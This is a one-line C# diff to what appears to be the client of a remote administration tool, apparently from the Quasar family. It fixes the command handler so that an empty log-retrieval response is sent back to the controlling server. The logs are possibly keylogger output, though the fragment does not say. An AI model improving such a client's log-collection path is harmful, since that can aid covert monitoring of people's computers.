@@ -378,7 +378,7 @@ namespace xClient.Core.Commands
 
                     if (iFiles.Length == 0)
                     {
-                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, iFiles.Length);
+                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, iFiles.Length).Execute(client);
                         return;
                     }
 
